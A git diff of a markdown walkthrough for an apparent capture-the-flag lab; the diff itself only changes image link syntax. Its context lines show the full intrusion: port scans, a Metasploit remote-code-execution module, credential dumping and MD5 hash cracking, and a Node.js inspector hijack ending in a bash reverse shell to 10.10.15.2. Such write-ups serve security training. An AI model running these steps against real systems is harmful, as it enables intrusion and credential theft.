@@ -11,7 +11,7 @@
 Before starting, the target IP was mapped to a custom hostname to
 ensure proper virtual host resolution throughout the engagement:
 
-![[etc-hosts.png]]
+![](Screenshots/etc-hosts.png)
 
 ---
 
@@ -23,7 +23,7 @@ The first step was a full TCP port scan across all 65535 ports:
 nmap reactor.lab -p- --min-rate 1000 -sV -sC o ports.txt
 ```
 
-![[nmap1.png]]
+![](Screenshots/nmap1.png)
 
 The initial scan returned only port **22 (SSH)**. Since the lab
 description referenced an additional service, a SYN scan was performed
@@ -33,7 +33,7 @@ for a more complete result:
 sudo nmap reactor.lab -sS -p- --min-rate 500 -o portx.txt
 ```
 
-![[nmap2.png]]
+![](Screenshots/nmap2.png)
 
 Port **3000** was discovered. A targeted service version scan confirmed
 an HTTP service running on that port:
@@ -42,7 +42,7 @@ an HTTP service running on that port:
 nmap reactor.lab -p 3000 -sC -sV
 ```
 
-![[nmap p- 3000.png]]
+![](Screenshots/nmap p- 3000.png)
 
 Key response headers:
 
@@ -59,7 +59,7 @@ x-nextjs-prerender: 1
 Accessing `http://reactor.lab:3000` in the browser revealed an internal
 management interface:
 
-![[application.png]]
+![](Screenshots/application.png)
 
 Key information gathered:
 
@@ -67,7 +67,7 @@ Key information gathered:
 - **Organisation:** REACTORWATCH™ — Nuclear Dynamics Corp. | Site-7
 - **Classification:** RESTRICTED
 
-![[application3.png]]
+![](Screenshots/application3.png)
 
 The application exposed system logs and three usernames with their
 respective roles within the organisation.
@@ -75,7 +75,7 @@ respective roles within the organisation.
 Intercepting traffic with Burp Suite confirmed the **Next.js** framework.
 The exact version could not be determined through enumeration alone.
 
-![[burpnextjs.png]]
+![](Screenshots/burpnextjs.png)
 
 ---
 
@@ -88,7 +88,7 @@ using Metasploit:
 search exploit nextjs
 ```
 
-![[msfconsole.png]]
+![](Screenshots/msfconsole.png)
 
 A module for **CVE-2025-55182** was identified — an
 unauthenticated Remote Code Execution vulnerability affecting React
@@ -96,13 +96,13 @@ Server Components in Next.js.
 
 The module was configured with the target parameters:
 
-![[msfconsoleoptions.png]]
+![](Screenshots/msfconsoleoptions.png)
 
 RHOSTS → reactor.lab  
 LHOST → tun0 (HTB VPN interface)  
 RPORT → 3000
 
-![[msfconsolesetoptions.png]]
+![](Screenshots/msfconsolesetoptions.png)
 
 Executing the module:
 
@@ -110,7 +110,7 @@ Executing the module:
 run
 ```
 
-![[shell.png]]
+![](Screenshots/shell.png)
 
 A shell was obtained as user **node**. An interactive bash session was
 immediately spawned for better usability:
@@ -146,7 +146,7 @@ SELECT sql FROM sqlite_master;
 The file was confirmed as a **SQLite 3.x** database. Connecting to it
 and dumping the full schema revealed sensitive information:
 
-![[findsql.png]]
+![](Screenshots/findsql.png)
 
 The `users` table contained the following columns:
 - `username`
@@ -158,7 +158,7 @@ The `users` table contained the following columns:
 SELECT username, password_hash, role, email FROM users;
 ```
 
-![[credentials.png]]
+![](Screenshots/credentials.png)
 
 Password hashes were extracted for two accounts: **admin** and
 **engineer**.
@@ -173,7 +173,7 @@ The extracted hashes were 32 hexadecimal characters long, matching the typical f
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashengineer.txt
 ```
 
-![[engineercracked.png]]
+![](Screenshots/engineercracked.png)
 
 The **engineer** account password was successfully cracked:
 
@@ -194,7 +194,7 @@ su engineer
 cd ~
 ```
 
-![[userflag.png]]
+![](Screenshots/userflag.png)
 
 **User flag captured.**
 
@@ -220,7 +220,7 @@ As the SUID enumeration returned only default Ubuntu binaries, attention shifted
 ps -efww
 ```
 
-![[ps-efww.png]]
+![](Screenshots/ps-efww.png)
 
 Listing all running processes revealed a suspicious entry:
 
@@ -239,9 +239,9 @@ systemctl list-units --type=service --state=running
 cat /etc/systemd/system/uptime-monitor.service
 ```
 
-![[systemctl.png]]
+![](Screenshots/systemctl.png)
 
-![[catmonitorservice.png]]
+![](Screenshots/catmonitorservice.png)
 
 The service configuration confirmed:
 
@@ -258,13 +258,13 @@ Querying the Inspector API directly:
 curl http://127.0.0.1:9229/json/version
 ```
 
-![[curljsonversion.png]]
+![](Screenshots/curljsonversion.png)
 
 ```
 curl http://127.0.0.1:9229/json
 ```
 
-![[websocketdebuggerurl.png]]
+![](Screenshots/websocketdebuggerurl.png)
 
 Response confirmed **Node.js v20.20.2** with an active Chrome DevTools
 Protocol (CDP) session:
@@ -305,7 +305,7 @@ expose it to the attacker machine:
 ssh -L 9229:127.0.0.1:9229 engineer@reactor.lab -N
 ```
 
-![[sshtunnel.png]]
+![](Screenshots/sshtunnel.png)
 
 This creates the following tunnel:
 
@@ -335,7 +335,7 @@ In the DevTools console, arbitrary JavaScript execution was confirmed:
 require('child_process').exec('whoami', (err, stdout) => console.log(stdout))
 ```
 
-![[devtools.png]]
+![](Screenshots/devtools.png)
 
 Output: `root`
 
@@ -353,7 +353,7 @@ The following payload was executed in the DevTools console to obtain a reverse s
 require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.15.2/9999 0>&1"')
 ```
 
-![[rootflag.png]]
+![](Screenshots/rootflag.png)
 
 Root shell received. The flag was retrieved:
 ```
